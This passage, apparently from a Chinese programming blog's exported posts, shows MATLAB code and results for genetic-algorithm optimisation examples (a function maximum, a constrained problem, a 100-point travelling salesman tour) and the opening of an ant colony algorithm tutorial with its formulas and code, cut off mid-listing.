class="line">%给适应度函数加上一个大小合理的数以便保证种群适应值为正数</span><br><span class="line">Fitvalue&#x3D;Fitvalue&#39;+230;</span><br><span class="line">%计算选择概率</span><br><span class="line">fsum&#x3D;sum(Fitvalue);</span><br><span class="line">Pperpopulation&#x3D;Fitvalue&#x2F;fsum;</span><br><span class="line">%计算累积概率</span><br><span class="line">cumsump &#x3D; cumsum(Pperpopulation);</span><br><span class="line">cumsump&#x3D;cumsump&#39;;</span><br><span class="line">end</span><br><span class="line">%子程序：新种群变异操作，函数名称存储为mutation.m</span><br><span class="line">function snnew&#x3D;mutation(snew,pmutation)</span><br><span class="line">BitLength&#x3D;size(snew,2);</span><br><span class="line">snnew&#x3D;snew;</span><br><span class="line">pmm&#x3D;IfCroIfMut(pmutation);  %根据变异概率决定是否进行变异操作，1则是，0则否</span><br><span class="line">if pmm&#x3D;&#x3D;1</span><br><span class="line">    chb&#x3D;round(rand*(BitLength-1))+1;  %在[1,BitLength]范围内随机产生一个变异位</span><br><span class="line">    snnew(chb)&#x3D;abs(snew(chb)-1);   %进行一个0-1,1-0的反转</span><br><span class="line">end</span><br><span class="line">end</span><br><span class="line"></span><br><span class="line">%子程序：判断遗传运算是否需要进行交叉或变异, 函数名称存储为IfCroIfMut.m</span><br><span class="line">function pcc&#x3D;IfCroIfMut(mutORcro)</span><br><span class="line">% 生成一个长为100的序列，随机选中一个点，该点前面的所有数为1，后面为1,</span><br><span class="line">% 然后又随机生成一个数进行判断是1还是0.</span><br><span class="line">test(1:100)&#x3D;0;</span><br><span class="line">l&#x3D;round(100*mutORcro);</span><br><span class="line">test(1:l)&#x3D;1;</span><br><span class="line">n&#x3D;round(rand*99)+1;</span><br><span class="line">pcc&#x3D;test(n);</span><br><span class="line">end</span><br><span class="line"></span><br><span class="line">%子程序：新种群选择操作, 函数名称存储为selection.m</span><br><span class="line">function seln&#x3D;selection(population,cumsump)</span><br><span class="line">%从种群中选择两个个体</span><br><span class="line">for i&#x3D;1:2</span><br><span class="line">    r&#x3D;rand;  %产生一个随机数</span><br><span class="line">    prand&#x3D;cumsump-r;</span><br><span class="line">    j&#x3D;1;</span><br><span class="line">    while prand(j)&lt;0</span><br><span class="line">        j&#x3D;j+1;</span><br><span class="line">    end</span><br><span class="line">    seln(i)&#x3D;j; %选中个体的序号</span><br><span class="line">end</span><br><span class="line">end</span><br><span class="line">%子程序：将2进制数转换为10进制数,函数名称存储为transform2to10.m</span><br><span class="line">function x&#x3D;transform2to10(Population)</span><br><span class="line">BitLength&#x3D;size(Population,2);</span><br><span class="line">x&#x3D;Population(BitLength);</span><br><span class="line">for i&#x3D;1:BitLength-1</span><br><span class="line">    x&#x3D;x+Population(BitLength-i)*power(2,i);</span><br><span class="line">end</span><br><span class="line">end</span><br><span class="line"></span><br><span class="line">%子程序：对于优化最大值或极大值函数问题，目标函数可以作为适应度函数</span><br><span class="line">%函数名称存储为targetfun.m</span><br><span class="line"></span><br><span class="line">function y&#x3D;targetfun(x) %目标函数</span><br><span class="line">y&#x3D;200*exp(-0.05*x).*sin(x);</span><br><span class="line">end</span><br></pre></td></tr></table></figure><p>程序结果：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">Bestpopulation &#x3D;</span><br><span class="line"></span><br><span class="line">   1.575677119096666</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Besttargetfunvalue &#x3D;</span><br><span class="line"></span><br><span class="line">     1.848457326200009e+02</span><br></pre></td></tr></table></figure><p><img data-src="https://pic.superbed.cn/item/5cfbad67451253d178d953a6.jpg" alt="算法迭代"></p><p><strong>案例二：多约束非线性规划问题</strong></p><p>$$<br>min f(x) = e^{x_1} (4x_1^2+2x_2^2+4x_1x_2+2_2+1) \\<br>s.t. \left\{<br>             \begin{array}{lr}<br>             x=\dfrac{3\pi}{2}(1+2t)\cos(\dfrac{3\pi}{2}(1+2t)), &amp;  \\<br>             y=s, &amp; 0\leq s\leq L,|t|\leq1.\\<br>             z=\dfrac{3\pi}{2}(1+2t)\sin(\dfrac{3\pi}{2}(1+2t)), &amp;<br>             \end{array}<br>\right.<br>$$</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">%主程序：本程序采用遗传算法接力进化，</span><br><span class="line">%将上次进化结束后得到的最终种群作为下次输入的初始种群</span><br><span class="line">clc;</span><br><span class="line">close all;</span><br><span class="line">clear all;</span><br><span class="line">%进化的代数</span><br><span class="line">T&#x3D;100;</span><br><span class="line">optionsOrigin&#x3D;gaoptimset(&#39;Generations&#39;,T&#x2F;2);</span><br><span class="line">[x,fval,reason,output,final_pop]&#x3D;ga(@ch14_2f,2,optionsOrigin);</span><br><span class="line">%进行第二次接力进化</span><br><span class="line">options1&#x3D;gaoptimset(&#39;Generations&#39;,T&#x2F;2,&#39;InitialPopulation&#39;,final_pop,...</span><br><span class="line">    &#39;PlotFcns&#39;,@gaplotbestf);</span><br><span class="line">[x,fval,reason,output,final_pop]&#x3D;ga(@ch14_2f,2,options1);</span><br><span class="line">Bestx&#x3D;x</span><br><span class="line">BestFval&#x3D;fval</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">%子函数：适应度函数同时也是目标函数,函数存储名称为ch14_2f.m</span><br><span class="line">function f&#x3D;ch14_2f(x)</span><br><span class="line">g1&#x3D;1.5+x(1)*x(2)-x(1)-x(2);</span><br><span class="line">g2&#x3D;-x(1)*x(2);</span><br><span class="line">if (g1&gt;0||g2&gt;10)</span><br><span class="line">    f&#x3D;100;</span><br><span class="line">else</span><br><span class="line">    f&#x3D;exp(x(1))*(4*x(1)^2+2*x(2)^2+4*x(1)*x(2)+2*x(2)+1);</span><br><span class="line">end</span><br><span class="line">end</span><br></pre></td></tr></table></figure><p>程序结果:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">Optimization terminated: maximum number of generations exceeded.</span><br><span class="line">Optimization terminated: maximum number of generations exceeded.</span><br><span class="line"></span><br><span class="line">Bestx &#x3D;</span><br><span class="line"></span><br><span class="line">  -9.026449478668987   1.105769708316651</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">BestFval &#x3D;</span><br><span class="line"></span><br><span class="line">   0.035051699473142</span><br><span class="line"></span><br><span class="line">&gt;&gt;</span><br></pre></td></tr></table></figure><p><strong>案例三：经典TSP问题</strong><br>假设有一个旅行商人要拜访n个城市，他必须选择所要走的路径，路径的限制是每个城市只能拜访一次，而且最后要回到原来出发的城市。路径的选择目标是要求得的路径路程为所有路径之中的最小值。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br></pre></td><td class="code"><pre><span class="line">% 利用遗传算法，解决TSP问题模板</span><br><span class="line">tic</span><br><span class="line">clc,clear</span><br><span class="line">sj &#x3D; load(&#39;yichuansuanfadata.txt&#39;); %加载敌方100 个目标的数据</span><br><span class="line">x&#x3D;sj(:,1:2:8);x&#x3D;x(:);</span><br><span class="line">y&#x3D;sj(:,2:2:8);y&#x3D;y(:);</span><br><span class="line">sj&#x3D;[x y];</span><br><span class="line">figure(1);</span><br><span class="line">plot(x,y);</span><br><span class="line">d1&#x3D;[70,40];</span><br><span class="line">sj0&#x3D;[d1;sj;d1];</span><br><span class="line">%距离矩阵d</span><br><span class="line">sj&#x3D;sj0*pi&#x2F;180;</span><br><span class="line">d&#x3D;zeros(102);</span><br><span class="line">for i&#x3D;1:101</span><br><span class="line">    for j&#x3D;i+1:102</span><br><span class="line">        temp&#x3D;cos(sj(i,1)-sj(j,1))*cos(sj(i,2))*cos(sj(j,2))+sin(sj(i,2))*sin(sj(j,2));</span><br><span class="line">        d(i,j)&#x3D;6370*acos(temp);</span><br><span class="line">    end</span><br><span class="line">end</span><br><span class="line">d&#x3D;d+d&#39;;L&#x3D;102;w&#x3D;50;dai&#x3D;100;</span><br><span class="line">%通过改良圈算法选取优良父代A</span><br><span class="line">for k&#x3D;1:w</span><br><span class="line">    c&#x3D;randperm(100);</span><br><span class="line">    c1&#x3D;[1,c+1,102];</span><br><span class="line">    flag&#x3D;1;</span><br><span class="line">    while flag&gt;0</span><br><span class="line">        flag&#x3D;0;</span><br><span class="line">        for m&#x3D;1:L-3</span><br><span class="line">            for n&#x3D;m+2:L-1</span><br><span class="line">                if d(c1(m),c1(n))+d(c1(m+1),c1(n+1))&lt;d(c1(m),c1(m+1))+d(c1(n),c1(n+1))</span><br><span class="line">                    flag&#x3D;1;</span><br><span class="line">                    c1(m+1:n)&#x3D;c1(n:-1:m+1);</span><br><span class="line">                end</span><br><span class="line">            end</span><br><span class="line">        end</span><br><span class="line">    end</span><br><span class="line">    J(k,c1)&#x3D;1:102;</span><br><span class="line">end</span><br><span class="line">J&#x3D;J&#x2F;102;</span><br><span class="line">J(:,1)&#x3D;0;J(:,102)&#x3D;1;</span><br><span class="line">rand(&#39;state&#39;,sum(clock));</span><br><span class="line">%遗传算法实现过程</span><br><span class="line">A&#x3D;J;</span><br><span class="line">for k&#x3D;1:dai %产生0～1 间随机数列进行编码</span><br><span class="line">    B&#x3D;A;</span><br><span class="line">    c&#x3D;randperm(w);</span><br><span class="line">    %交配产生子代B</span><br><span class="line">    for i&#x3D;1:2:w</span><br><span class="line">        F&#x3D;2+floor(100*rand(1));</span><br><span class="line">        temp&#x3D;B(c(i),F:102);</span><br><span class="line">        B(c(i),F:102)&#x3D;B(c(i+1),F:102);</span><br><span class="line">        B(c(i+1),F:102)&#x3D;temp;</span><br><span class="line">    end</span><br><span class="line">    %变异产生子代C</span><br><span class="line">    by&#x3D;find(rand(1,w)&lt;0.1);</span><br><span class="line">    if length(by)&#x3D;&#x3D;0</span><br><span class="line">        by&#x3D;floor(w*rand(1))+1;</span><br><span class="line">    end</span><br><span class="line">    C&#x3D;A(by,:);</span><br><span class="line">    L3&#x3D;length(by);</span><br><span class="line">    for j&#x3D;1:L3</span><br><span class="line">        bw&#x3D;2+floor(100*rand(1,3));</span><br><span class="line">        bw&#x3D;sort(bw);</span><br><span class="line">        C(j,:)&#x3D;C(j,[1:bw(1)-1,bw(2)+1:bw(3),bw(1):bw(2),bw(3)+1:102]);</span><br><span class="line">    end</span><br><span class="line">    G&#x3D;[A;B;C];</span><br><span class="line">    TL&#x3D;size(G,1);</span><br><span class="line">    %在父代和子代中选择优良品种作为新的父代</span><br><span class="line">    [dd,IX]&#x3D;sort(G,2);temp(1:TL)&#x3D;0;</span><br><span class="line">    for j&#x3D;1:TL</span><br><span class="line">        for i&#x3D;1:101</span><br><span class="line">            temp(j)&#x3D;temp(j)+d(IX(j,i),IX(j,i+1));</span><br><span class="line">        end</span><br><span class="line">    end</span><br><span class="line">    [DZ,IZ]&#x3D;sort(temp);</span><br><span class="line">    A&#x3D;G(IZ(1:w),:);</span><br><span class="line">end</span><br><span class="line">path&#x3D;IX(IZ(1),:)</span><br><span class="line">long&#x3D;DZ(1)</span><br><span class="line">toc</span><br><span class="line">xx&#x3D;sj0(path,1);yy&#x3D;sj0(path,2);</span><br><span class="line">%plot(xx,yy,&#39;-o&#39;,)</span><br><span class="line">figure(2);</span><br><span class="line">plot(xx,yy,&#39;-o&#39;)</span><br></pre></td></tr></table></figure><p>其中”yichuansuanfadata.txt”为各点之间的经纬坐标,数据如下:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">53.7121   15.304651.1758    0.032246.3253   28.275330.3313    6.9348</span><br><span class="line">56.5432   21.418810.8198   16.252922.7891   23.104510.1584   12.4819</span><br><span class="line">20.1050   15.45621.9451    0.205726.4951   22.122131.4847    8.9640</span><br><span class="line">26.2418   18.176044.0356   13.540128.9836   25.987938.4722   20.1731</span><br><span class="line">28.2694   29.001132.1910    5.869936.4863   29.72840.9718   28.1477</span><br><span class="line">8.9586   24.663516.5618   23.614310.5597   15.117850.2111   10.2944</span><br><span class="line">8.1519    9.532522.1075   18.55690.1215   18.872648.2077   16.8889</span><br><span class="line">31.9499   17.63090.7732    0.465647.4134   23.778341.8671    3.5667</span><br><span class="line">43.5474    3.906153.3524   26.725630.8165   13.459527.7133    5.0706</span><br><span class="line">23.9222    7.630651.9612   22.851112.7938   15.73074.9568    8.3669</span><br><span class="line">21.5051   24.090915.2548   27.21116.2070    5.144249.2430   16.7044</span><br><span class="line">17.1168   20.035434.1688   22.75719.4402    3.920011.5812   14.5677</span><br><span class="line">52.1181    0.40889.5559   11.421924.4509    6.563426.7213   28.5667</span><br><span class="line">37.5848   16.847435.6619    9.933324.4654    3.16440.7775    6.9576</span><br><span class="line">14.4703   13.636819.8660   15.12243.1616    4.242818.5245   14.3598</span><br><span class="line">58.6849   27.148539.5168   16.937156.5089   13.709052.5211   15.7957</span><br><span class="line">38.4300    8.464851.8181   23.01598.9983   23.644050.1156   23.7816</span><br><span class="line">13.7909    1.951034.0574   23.396023.0624    8.431919.9857    5.7902</span><br><span class="line">40.8801   14.297858.8289   14.522918.6635    6.743652.8423   27.2880</span><br><span class="line">39.9494   29.511447.5099   24.066410.1121   27.266228.7812   27.6659</span><br><span class="line">8.0831   27.67059.1556   14.130453.7989    0.219933.6490    0.3980</span><br><span class="line">1.3496   16.835949.9816    6.082819.3635   17.662236.9545   23.0265</span><br><span class="line">15.7320   19.569711.5118   17.388444.0398   16.263539.7139   28.4203</span><br><span class="line">6.9909   23.180438.3392   19.995024.6543   19.605736.9980   24.3992</span><br><span class="line">4.1591    3.185340.1400   20.303023.9876    9.403041.1084   27.7149</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><strong>其中奇数列为经度，偶数列为纬度</strong></p><p>求解结果如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">path &#x3D;</span><br><span class="line"></span><br><span class="line">  1 至 19 列</span><br><span class="line"></span><br><span class="line">     1    17     3    36    43    93    46    59   100    98    51    80    50    15    42    20    30    74    83</span><br><span class="line"></span><br><span class="line">  20 至 38 列</span><br><span class="line"></span><br><span class="line">    87    92     2    45    67    82    48    72    14    27    10    84    18    40    79    77    31    97    85</span><br><span class="line"></span><br><span class="line">  39 至 57 列</span><br><span class="line"></span><br><span class="line">    65    64    11    76    69    94    70    19    63    62    26    29    34    66    90    86     8    39    78</span><br><span class="line"></span><br><span class="line">  58 至 76 列</span><br><span class="line"></span><br><span class="line">    47    23    58    81    22    71    37     7    68    25    49    28    57    88    61    16    91    41     4</span><br><span class="line"></span><br><span class="line">  77 至 95 列</span><br><span class="line"></span><br><span class="line">    73    13    24    32    12    53    33    75     5    60     9    38    44    54    55    96    89     6    56</span><br><span class="line"></span><br><span class="line">  96 至 102 列</span><br><span class="line"></span><br><span class="line">    21    99   101    52    95    35   102</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">long &#x3D;</span><br><span class="line"></span><br><span class="line">     4.087894090467779e+04</span><br><span class="line"></span><br><span class="line">时间已过 8.865015 秒。</span><br><span class="line">&gt;&gt; </span><br></pre></td></tr></table></figure><p><img data-src="https://pic.superbed.cn/item/5cfbad75451253d178d95496.jpg" alt="TSP原路径"></p><p><img data-src="https://pic1.superbed.cn/item/5cfbae91451253d178d96266.jpg" alt="求解后路径"></p>]]></content>
      
      
      <categories>
          
          <category> 数学建模 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 算法 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>蚁群算法及其MATLAB实现</title>
      <link href="/archives/3b36af0a.html"/>
      <url>/archives/3b36af0a.html</url>
      
        <content type="html"><![CDATA[<h2 id="1-蚁群算法原理"><a href="#1-蚁群算法原理" class="headerlink" title="1. 蚁群算法原理"></a>1. 蚁群算法原理</h2><h3 id="1-1-蚁群算法的基本思想"><a href="#1-1-蚁群算法的基本思想" class="headerlink" title="1.1 蚁群算法的基本思想"></a>1.1 蚁群算法的基本思想</h3><p> 蚁群算法的基本原理来源于自然界蚂蚁觅食的最短路径原理，蚂蚁在寻找食物源时，能在其走过的路径上释放一种蚂蚁特有的分泌物–<strong>信息素</strong>，使得一定范围内的其他蚂蚁能够察觉到并由此影响他们以后的行为。<strong>当一些路径上通过的蚂蚁越来越多时，其留下的信息素也越来越多，以致信息素强度增大，所以蚂蚁选择选该路径的概率也越高，从而更增加了该路径的信息素强度，这种选择过程被称为蚂蚁的自催化行为</strong>。由于其原理是一种正反馈机制，因此，也可将蚂蚁王国理解为所谓的增强型学习系统。</p><a id="more"></a><h3 id="1-2-蚁群算法的数学模型"><a href="#1-2-蚁群算法的数学模型" class="headerlink" title="1.2 蚁群算法的数学模型"></a>1.2 蚁群算法的数学模型</h3><p>这个利用TSP问题来说明这个数学模型，对于TSP问题，设蚂蚁群体中蚂蚁的数量为$m$，城市的数量为$n$，城市$i$与城市$j$之间的距离为$d_{ij}$，t时刻城市$i$与城市$j$连接路径上的信息素浓度为$c_{ij}(t)$。初始时刻，蚂蚁被放置在不同的城市里，且各城市键连接路径上的信息素浓度相同。然后蚂蚁将按一定概率选择线路，不放设$p^K_{ij}(t)$为t时刻蚂蚁$k$从城市$i$转移到城市$j$的概率。“蚂蚁TSP”策略收到两方面的左右，首先是访问某城市的期望，另外便是其他蚂蚁释放的信息素浓度。所以定义：</p><p>$$<br>p^k_{ij}(t) =\frac{[c_{ij}(t)]^a \times [n_{ij}(t)]^b}{sum([c_{ij}(t)]^a \times [n_{ij}(t)^b]} ),j∈allowk \\<br>             0,j∉allowk<br>$$</p><ul><li><p>$n_{ij}(t)$为启发函数，表示蚂蚁从城市i转移到城市j的期望；</p></li><li><p>$allowk$为蚂蚁$k$待访问城市集合，开始时，$allowk$中有$n-1$个元素，即包括除了蚂蚁$k$出发城市的其他多个城市，随着时间的推移，$allowk$中的元素越来越少，直至为空；</p></li><li><p>$a$ 为信息素重要程度因子</p></li><li><p>$b$为启发函数因子</p><p>在蚂蚁遍历各城市的过程中，与实际情况相似的是，在蚂蚁释放信息素的同事，各个城市之间连接路径上的信息素的强度也在通过挥发等方式逐渐消失。为了描述这个特征，设ρ表示信息素挥发程度。这样所有蚂蚁完成走完一遍所有城市之后，各个城市键连接路径上的信息素浓度为</p></li></ul><p>$$<br> c_{ij}(t+1)  =  （1-\rho）*c_{ij}(t)+\Delta c_{ij} \\<br>  \Delta c_{ij} = \sum{}{} \Delta c_{ij}^k<br>$$</p><ul><li>$\Delta c_{ij}^k$为第k只蚂蚁在城市i与城市k连接路径上释放信息素而增加的信息素浓度</li><li>$\Delta c_{ij}$ 为所有蚂蚁在城市i与城市j连接路径上释放信息素而增加的信息素浓度。</li><li> 一般情况下</li></ul><p>$$<br>\Delta cijk = \frac{Q}{L_k} , 若蚂蚁k从城市i访问了城市j \\<br>            0 ,否则<br>$$</p><ul><li>$Q $为信息素常数</li><li>$L_k$ 为第k只蚂蚁经过路径总长度</li></ul><h3 id="1-3-蚁群算法流程"><a href="#1-3-蚁群算法流程" class="headerlink" title="1.3 蚁群算法流程"></a>1.3 蚁群算法流程</h3><p><img data-src="https://pic.superbed.cn/item/5cfbacb8451253d178d93f2f.png"></p><h2 id="2-蚁群算法的MATLAB实现"><a href="#2-蚁群算法的MATLAB实现" class="headerlink" title="2. 蚁群算法的MATLAB实现"></a>2. 蚁群算法的MATLAB实现</h2><h3 id="2-1-算法设步骤"><a href="#2-1-算法设步骤" class="headerlink" title="2.1 算法设步骤"></a>2.1 算法设步骤</h3><p>1.数据准备<br>2.计算城市距离矩阵<br>3.初始化参数<br>4.迭代寻找最佳路径<br>5.结果显示</p><h3 id="2-2-程序代码"><a href="#2-2-程序代码" class="headerlink" title="2.2 程序代码"></a>2.2 程序代码</h3><p>程序中使用到的文件”Chap9_citys_data.xlsx”链接如下:<br>链接：<span class="exturl" data-url="aHR0cHM6Ly9wYW4uYmFpZHUuY29tL3MvMU1TdHlBRElyaEZ0REhvVkpVdVRqemc=" title="https://pan.baidu.com/s/1MStyADIrhFtDHoVJUuTjzg">https://pan.baidu.com/s/1MStyADIrhFtDHoVJUuTjzg<i class="fa fa-external-link"></i></span><br>提取码：t24f </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br></pre></td><td class="code"><pre><span class="line">%--------------------------------------------------------------------------</span><br><span class="line">%% 数据准备</span><br><span class="line">% 清空环境变量</span><br><span class="line">clear all</span><br><span class="line">clc</span><br><span class="line"></span><br><span class="line">% 程序运行计时开始</span><br><span class="line">t0 &#x3D; clock;</span><br><span class="line">%导入数据</span><br><span class="line">citys&#x3D;xlsread(&#39;Chap9_citys_data.xlsx&#39;, &#39;B2:C53&#39;);</span><br><span class="line">%--------------------------------------------------------------------------</span><br><span class="line">%% 计算城市间相互距离</span><br><span class="line">n &#x3D; size(citys,1);</span><br><span class="line">D &#x3D; zeros(n,n);</span><br><span class="line">for i &#x3D; 1:n</span><br><span class="line">    for j &#x3D; 1:n</span><br><span class="line">        if i ~&#x3D; j</span><br><span class="line">            D(i,j) &#x3D; sqrt(sum((citys(i,:) - citys(j,:)).^2));</span><br><span class="line">        else</span><br><span class="line">            D(i,j) &#x3D; 1e-4;      %设定的对角矩阵修正值</span><br><span class="line">        end</span><br><span class="line">    end    </span><br><span class="line">end</span><br><span class="line">%--------------------------------------------------------------------------</span><br><span class="line">%% 初始化参数</span><br><span class="line">m &#x3D; 75;                              % 蚂蚁数量</span><br><span class="line">alpha &#x3D; 1;                           % 信息素重要程度因子</span><br><span class="line">beta &#x3D; 5;                            % 启发函数重要程度因子</span><br><span class="line">vol &#x3D; 0.2;                           % 信息素挥发(volatilization)因子</span><br><span class="line">Q &#x3D; 10;                               % 常系数</span><br><span class="line">Heu_F &#x3D; 1.&#x2F;D;                        % 启发函数(heuristic function)</span><br><span class="line">Tau &#x3D; ones(n,n);                     % 信息素矩阵</span><br><span class="line">Table &#x3D; zeros(m,n);                  % 路径记录表</span><br><span class="line">iter &#x3D; 1;                            % 迭代次数初值</span><br><span class="line">iter_max &#x3D; 100;                      % 最大迭代次数 </span><br><span class="line">Route_best &#x3D; zeros(iter_max,n);      % 各代最佳路径       </span><br><span class="line">Length_best &#x3D; zeros(iter_max,1);     % 各代最佳路径的长度  </span><br><span class="line">Length_ave &#x3D; zeros(iter_max,1);      % 各代路径的平均长度  </span><br><span class="line">Limit_iter &#x3D; 0;                      % 程序收敛时迭代次数</span><br><span 